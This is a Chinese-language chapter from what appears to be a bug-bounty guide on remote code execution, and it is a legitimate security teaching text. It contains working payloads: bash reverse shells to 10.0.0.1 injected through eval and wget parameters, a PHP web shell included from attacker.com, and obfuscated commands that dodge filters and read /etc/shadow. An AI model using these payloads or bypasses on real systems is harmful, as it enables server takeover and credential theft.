# 第18章：远程代码执行（Remote Code Execution）

当攻击者因漏洞或配置错误而能够在目标机器上执行任意代码时，就会发生远程代码执行（RCE）。RCE极其危险，因为攻击者通常最终能够入侵Web应用程序甚至底层Web服务器。

实现RCE没有单一的技术。在前面的章节中，我提到攻击者可以通过SQL注入、不安全的反序列化和模板注入来实现RCE。在本章中，我们将讨论另外两种可能允许你在目标系统上执行代码的策略：代码注入和文件包含漏洞。

在我们继续之前，请记住，开发RCE利用通常需要对编程、Linux命令和Web应用程序开发有更深入的理解。一旦你掌握了发现更简单漏洞的技巧，就可以开始朝着这个方向努力了。

## 机制

有时攻击者可以通过直接将恶意代码注入到被执行的代码中来实现RCE。这被称为**代码注入**漏洞。攻击者也可以通过将恶意代码放入被受害者应用程序执行或包含的文件中来实现RCE，这被称为**文件包含**漏洞。

### 代码注入

当应用程序允许用户输入与可执行代码混淆时，就会发生代码注入漏洞。有时这是无意中发生的，当应用程序将未清理的数据传递给执行的代码时；其他时候，这是作为有意功能构建在应用程序中的。

例如，假设你是一个正在尝试构建在线计算器的开发人员。Python的`eval()`函数接受一个字符串并将其作为Python代码执行：`eval("1+1")`将返回2，`eval("1*3")`将返回3。由于它在评估各种用户提交表达式方面的灵活性，`eval()`是实现计算器的便捷方式。结果，你编写了以下Python代码来实现该功能。该程序将接受用户输入字符串，通过`eval()`传递它，并返回结果：

```python
def calculate(input):
    return eval("{}".format(input))

result = calculate(user_input.calc)
print("The result is {}.".format(result))
```

用户可以通过以下GET请求向计算器发送操作。当按预期运行时，以下用户输入将输出字符串`The result is 3`：

```
GET /calculator?calc=1+2
Host: example.com
```

但既然此处的`eval()`接受用户提供的输入并将其作为Python代码执行，攻击者可以向应用程序提供更恶意的内容。还记得第16章中Python的`os.system()`命令吗？它将其输入字符串作为系统命令执行。想象一下，攻击者向`calculate()`函数提交了以下HTTP请求：

```
GET /calculator?calc="__import__('os').system('ls')"
Host: example.com
```

结果，程序将执行`eval("__import__('os').system('ls')")`并返回系统命令`ls`的结果。由于`eval()`可用于在系统上执行任意代码，如果你将未清理的用户输入传递给`eval()`函数，你就向应用程序引入了代码注入漏洞。

攻击者还可以做一些更具破坏性的事情，如下所示。此输入将导致应用程序调用`os.system()`并向IP `10.0.0.1`的8080端口生成一个反向shell：

```
GET /calculator?calc="__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')"
Host: example.com
```

**反向shell**使目标服务器与攻击者的机器通信，并建立一个可远程访问的连接，允许攻击者执行系统命令。

代码注入的另一种变体发生在用户输入被直接拼接到系统命令中时。这也被称为**命令注入**漏洞。除了发生在Web应用程序中，命令注入在嵌入式Web应用程序中也极其普遍，因为它们依赖于shell命令和使用执行shell命令的包装器的框架。

假设 example.com 还有一个功能，允许你下载远程文件并在网站上查看它。为了实现此功能，应用程序使用系统命令`wget`来下载远程文件：

```python
import os

def download(url):
    os.system("wget -O- {}".format(url))

display(download(user_input.url))
```

`wget`命令是一个给定URL下载网页的工具，`-O-`选项使`wget`下载文件并将其显示在标准输出中。综合起来，该程序从用户输入获取URL，并将其传递给使用`os.system()`执行的`wget`命令。例如，如果你提交以下请求，应用程序将下载Google首页的源代码并显示给你：

```
GET /download?url=google.com
Host: example.com
```

由于用户输入被直接传递到系统命令中，攻击者甚至可以不使用Python函数就注入系统命令。这是因为在Linux命令行中，分号（`;`）字符分隔各个命令，因此攻击者可以在`wget`命令之后通过分号后跟任意命令来执行任意命令。例如，以下输入将导致应用程序向IP `10.0.0.1`的8080端口生成一个反向shell：

```
GET /download?url="google.com;bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
Host: example.com
```

### 文件包含

大多数编程语言都具有允许开发人员包含外部文件以评估其中包含的代码的功能。当开发人员想要将图像等外部资源文件合并到应用程序中、使用外部代码库或重用为其他目的编写的代码时，这很有用。

攻击者实现RCE的另一种方式是让目标服务器包含一个包含恶意代码的文件。这种**文件包含漏洞**有两种子类型：远程文件包含和本地文件包含。

**远程文件包含漏洞**发生在应用程序允许包含来自远程服务器的任意文件时。当应用程序动态包含外部文件和脚本，并使用用户输入来确定所包含文件的位置时，就会发生这种情况。

为了了解其工作原理，让我们看一个易受攻击的应用程序。以下PHP程序对用户提交的HTTP GET参数`page`的值调用PHP的`include`函数。然后`include`函数包含并评估指定的文件：

```php
<?php
// Some PHP code
$file = $_GET["page"];
include $file;
// Some PHP code
?>
```

此代码允许用户通过更改`page`参数来访问网站的各种页面。例如，要查看站点的Index和About页面，用户可以分别访问`http://example.com/?page=index.php`和`http://example.com/?page=about.php`。

但如果应用程序不限制用户通过`page`参数包含哪个文件，攻击者可以托管一个恶意PHP文件并将其包含进来，让目标服务器执行它。

在这种情况下，让我们托管一个名为`malicious.php`的PHP页面，它将执行URL GET参数`cmd`中包含的字符串作为系统命令。PHP中的`system()`命令类似于Python中的`os.system()`。它们都执行系统命令并显示输出。以下是我们的恶意PHP文件的内容：

```php
<?PHP
system($_GET["cmd"]);
?>
```

如果攻击者在 example.com 上加载此页面，站点将评估位于攻击者服务器上的`malicious.php`中包含的代码。恶意脚本将让目标服务器执行系统命令`ls`：

```
http://example.com/?page=http://attacker.com/malicious.php?cmd=ls
```

注意，同样的功能也容易受到SSRF和XSS的攻击。该端点容易受到SSRF攻击，因为该页面可以加载有关本地系统和网络的信息。攻击者还可以使该页面加载恶意JavaScript文件，并诱骗用户点击它以执行反射型XSS攻击。

另一方面，**本地文件包含**发生在应用程序以不安全的方式包含文件，但不允许包含远程文件时。在这种情况下，攻击者需要首先将恶意文件上传到本地机器，然后通过本地文件包含执行它。让我们稍微修改之前的示例。以下PHP文件首先获取HTTP GET参数`page`，然后在将`page`与包含用户可加载文件的目录名称拼接后调用PHP的`include`函数：

```php
<?php
// Some PHP code
$file = $_GET["page"];
include "lang/".$file;
// Some PHP code
?>
```

站点的`lang`目录包含多种语言的首页。例如，用户可以访问`http://example.com/?page=de-index.php`和`http://example.com/?page=en-index.php`分别访问德语和英语首页。这些URL将使网站加载页面`/var/www/html/lang/de-index.php`和`/var/www/html/lang/en-index.php`来显示德语和英语首页。

在这种情况下，如果应用程序不对`page`参数的可能值施加任何限制，攻击者可以通过利用上传功能加载自己的页面。假设 example.com 允许用户上传所有文件类型的文件，然后将它们存储在`/var/www/html/uploads/USERNAME`目录中。攻击者可以将恶意PHP文件上传到上传文件夹。然后他们可以使用`../`序列逃出`lang`目录并在目标服务器上执行恶意上传的文件：

```
http://example.com/?page=../uploads/USERNAME/malicious.php
```

如果攻击者加载此URL，网站将包含文件`/var/www/html/lang/../uploads/USERNAME/malicious.php`，这指向`/var/www/html/uploads/USERNAME/malicious.php`。

## 防御措施

为了防止代码注入，你应该避免将用户输入插入到会被评估的代码中。此外，由于用户输入可以通过应用程序解析的文件传递到被评估的代码中，你应该将用户上传的文件视为不受信任的，并保护程序执行、解析或包含的现有系统文件的完整性。

为了防止文件包含漏洞，你应该避免基于用户输入包含文件。如果这不可能，禁止包含远程文件，并为你的程序可以包含的本地文件创建白名单。你还可以将文件上传限制为某些安全的文件类型，并将上传的文件托管在与应用程序源代码不同的环境中。

还要避免直接调用系统命令，而是使用编程语言的系统API。大多数编程语言都有内置函数，允许你运行系统命令而无需冒命令注入的风险。例如，PHP有一个名为`mkdir(DIRECTORY_NAME)`的函数。你可以使用它来创建新目录，而不是调用`system("mkdir DIRECTORY_NAME")`。

你应该对传递给危险函数（如`eval()`或`include()`）的输入实施强输入验证。但这项技术不能作为唯一的保护形式，因为攻击者不断提出创造性的方法来绕过输入验证。

最后，保持补丁更新将防止应用程序的依赖项引入RCE漏洞。应用程序的依赖项（如开源包和组件）经常将漏洞引入应用程序。这也被称为**软件供应链攻击**。

你也可以部署Web应用防火墙（WAF）来阻止可疑攻击。除了防止RCE，这还可以帮助防止本书前面讨论的一些漏洞，如SQL注入和XSS。

如果攻击者在机器上实现了RCE，你如何最小化他们可能造成的危害？**最小权限原则**规定应用程序和进程应仅被授予完成其任务所需的权限。这是一种最佳实践，可降低攻击期间系统受损的风险，因为即使攻击者入侵了低权限用户或进程，也无法获得对敏感文件和操作的访问权限。例如，当Web应用程序仅需要读取文件时，不应授予任何写入或执行权限。这是因为，如果攻击者劫持了一个以高权限运行的应用程序，攻击者就可以获得其权限。

## 寻找RCE

与我们迄今为止介绍的大多数攻击一样，RCE有两种类型：经典型和盲型。经典RCE是指你可以在后续HTTP响应中读取代码执行结果的情况，而盲RCE是指恶意代码被执行但执行结果不显示在任何HTTP响应中的情况。虽然攻击者无法看到他们执行的结果，但盲RCE与经典RCE一样危险，因为它们可以使攻击者生成反向shell或将数据外泄到远程服务器。寻找这两种类型的RCE是类似的过程，但你确认这些漏洞所需的命令或代码片段会有所不同。

以下是一些在攻击Linux服务器时可以使用的命令。在寻找经典RCE漏洞时，验证漏洞所需的全部操作是执行像`whoami`这样的命令，该命令输出当前用户的用户名。如果响应包含Web服务器的用户名（如`www-data`），你就确认了RCE，因为命令已成功运行。另一方面，要验证盲RCE，你需要执行一个影响系统行为的命令，如`sleep 5`，它会将响应延迟五秒。然后如果你在收到响应之前经历了五秒的延迟，你就可以确认该漏洞。与我们用于利用其他漏洞的盲技术类似，你也可以设置一个监听器并尝试从目标服务器触发带外交互。

### 第1步：收集关于目标的信息

发现任何漏洞的第一步是收集关于目标的信息。在寻找RCE时，这一步尤其重要，因为实现RCE的路径极度依赖于目标的构建方式。你应该找出关于Web服务器、编程语言以及当前目标使用的其他技术的信息。使用第5章概述的侦察步骤来完成此操作。

### 第2步：识别可疑的用户输入位置

与发现许多其他漏洞一样，发现RCE的下一步是识别用户可以提交输入的位置。在寻找代码注入时，注意每个直接的用户输入位置，包括URL参数、HTTP头、请求体参数和文件上传。有时应用程序会解析用户提供的文件并不安全地将其内容拼接到执行的代码中，因此任何最终传递给命令的输入都是你应该注意的。

要发现潜在的文件包含漏洞，检查用于确定文件名或路径的输入位置，以及应用程序中的任何文件上传功能。

### 第3步：提交测试载荷

接下来你应该做的是向应用程序提交测试载荷。对于代码注入漏洞，尝试旨在被服务器解释为代码的载荷，看看它们是否被执行。例如，以下是你可以使用的载荷列表：

**Python载荷**

如果Python执行成功，此命令旨在打印字符串`RCE test!`：

```python
print("RCE test!")
```

此命令打印系统命令`ls`的结果：

```python
"__import__('os').system('ls')"
```

此命令将响应延迟10秒：

```python
"__import__('os').system('sleep 10')"
```

**PHP载荷**

如果执行成功，此命令旨在打印本地PHP配置信息：

```php
phpinfo();
```

此命令打印系统命令`ls`的结果：

```php
<?php system("ls");?>
```

此命令将响应延迟10秒：

```php
<?php system("sleep 10");?>
```

**Unix载荷**

此命令打印系统命令`ls`的结果：

```bash
;ls;
```

这些命令将响应延迟10秒：

```bash
| sleep 10;
& sleep 10;
` sleep 10;`
$(sleep 10)
```

对于文件包含漏洞，你应该尝试使端点包含一个远程文件或一个你可以控制的本地文件。例如，对于远程文件包含，你可以尝试几种形式的指向你托管在外部恶意文件的URL：

```bash
http://example.com/?page=http://attacker.com/malicious.php
http://example.com/?page=http:attacker.com/malicious.php
```

对于本地文件包含漏洞，尝试指向你可以控制的本地文件的不同URL：

```bash
http://example.com/?page=../uploads/malicious.php
http://example.com/?page=..%2fuploads%2fmalicious.php
```

你可以使用在第13章学到的绕过技术来构造同一URL的不同形式。

### 第4步：确认漏洞

最后，通过执行无害命令（如`whoami`、`ls`和`sleep 5`）来确认漏洞。

## 提升攻击影响

在提升RCE漏洞时要格外小心。大多数公司更希望你根本不要尝试提升它们，因为他们不希望有人在包含机密数据的系统中探查。在典型的渗透测试中，黑客在获得RCE后通常会尝试找出当前用户的权限并尝试提权攻击。但在漏洞赏金的背景下，这不合适。你可能意外读取有关客户的敏感信息，或通过修改关键文件对系统造成损害。仔细阅读赏金计划规则以避免越界是很重要的。

对于经典RCE，创建一个执行无害命令（如`whoami`或`ls`）的概念验证。你也可以通过读取常见的系统文件（如`/etc/passwd`）来证明你发现了RCE。你可以使用`cat`命令读取系统文件：

```bash
cat /etc/passwd
```

在Linux系统上，`/etc/passwd`文件包含系统账户及其用户ID、组ID、主目录和默认shell的列表。此文件通常无需特殊权限即可读取，因此它是一个很好的首次尝试访问的文件。

最后，你可以在系统上创建一个具有唯一文件名的文件，如`rce_by_YOUR_NAME.txt`，以便明确该文件是你POC的一部分。你可以使用`touch`命令在当前目录中创建具有指定名称的文件：

```bash
touch rce_by_YOUR_NAME.txt
```

对于盲RCE，创建一个执行`sleep`命令的POC。你也可以在目标机器上创建连接到你的系统的反向shell，以获得更有影响力的POC。然而，这通常违反计划规则，因此请务必事先与计划确认。

在为RCE漏洞创建POC时，很容易超出赏金政策的边界并对目标站点造成意外损害。当你创建POC时，确保你的载荷执行无害命令，并且你的报告描述了实现RCE所需的步骤。通常，读取非敏感文件或在随机路径下创建文件足以证明你的发现。

## 绕过RCE保护

许多应用程序已经意识到RCE的危险，并采用输入验证或防火墙来阻止潜在恶意请求。但编程语言通常相当灵活，这使得我们能够在输入验证规则的范围内工作，使攻击成功！以下是一些基本的输入验证绕过方法，在应用程序阻止你的载荷时你可以尝试。

对于Unix系统命令，你可以插入引号和双引号而不改变命令的行为。如果系统正在过滤某些字符串，你也可以使用通配符替换任意字符。最后，任何空的命令替换结果都可以插入到字符串中而不改变结果。例如，以下命令都将打印`/etc/shadow`的内容：

```bash
cat /etc/shadow
cat "/e"tc'/shadow'
cat /etc/sh*dow
cat /etc/sha``dow
cat /etc/sha$()dow
cat /etc/sha${}dow
```

你还可以改变在PHP中编写同一命令的方式。例如，PHP允许你将函数名作为字符串连接。你甚至可以十六进制编码函数名，或在命令中插入PHP注释而不改变其结果：

```php
/* Text surrounded by these brackets are comments in PHP. */
```

例如，假设你想在PHP中执行此系统命令：

```php
system('cat /etc/shadow');
```

以下示例通过连接字符串`sys`和`tem`来执行系统命令：

```php
('sys'.'tem')('cat /etc/shadow');
```

以下示例做同样的事情，但在命令中间插入了一个空白注释：

```php
system/**/('ls');
```

这行代码是系统命令的十六进制编码版本：

```php
'\x73\x79\x73\x74\x65\x6d'('ls');
```

Python中存在类似的行为。以下在Python语法中都是等价的：

```python
__import__('os').system('cat /etc/shadow')
__import__('o'+'s').system('cat /etc/shadow')
__import__('\x6f\x73').system('cat /etc/shadow')
```

此外，一些服务器将具有相同名称的多个参数的值拼接成单个值。在这种情况下，你可以将恶意代码分成块以绕过输入验证。例如，如果防火墙阻止包含字符串`system`的请求，你可以将RCE载荷分成块，如下所示：

```
GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"
Host: example.com
```

参数将通过防火墙而不会出现问题，因为请求在技术上不包含字符串`system`。但当服务器处理请求时，参数值将被拼接成一个形成我们的RCE载荷的字符串：`"__import__('os').system('ls')"`。

这只是你可以尝试的过滤器绕过的一小部分；还有更多。例如，你可以对载荷进行十六进制编码、URL编码、双重URL编码，并改变大小写（大写或小写字符）。你也可以尝试在载荷中插入特殊字符，如空字节、换行符、转义字符（`\`）和其他特殊或非ASCII字符。然后，观察哪些载荷被阻止，哪些成功，并构造能够绕过过滤器以达到预期结果的利用。如果你对此主题感兴趣，在线搜索`RCE filter bypass`或`WAF bypass`以了解更多。此外，本节提到的原则也可用于绕过其他漏洞的输入验证，如SQL注入和XSS。

## 找到你的第一个RCE！

是时候使用你在本章学到的技巧和窍门来找到你的第一个RCE了。

1. **识别可疑的用户输入位置**。对于代码注入，注意每个用户输入位置，包括URL参数、HTTP头、请求体参数和文件上传。要发现潜在的文件包含漏洞，检查用于确定或构造文件名的输入位置以及文件上传功能。
2. **向输入位置提交测试载荷**以检测潜在漏洞。
3. **如果你的请求被阻止**，尝试绕过技术，看看你的载荷是否成功。
4. **最后，通过尝试执行无害命令**（如`whoami`、`ls`和`sleep 5`）来确认漏洞。
5. **避免使用你发现的漏洞读取敏感系统文件**或更改任何文件。
6. **向计划提交你的第一份RCE报告！**
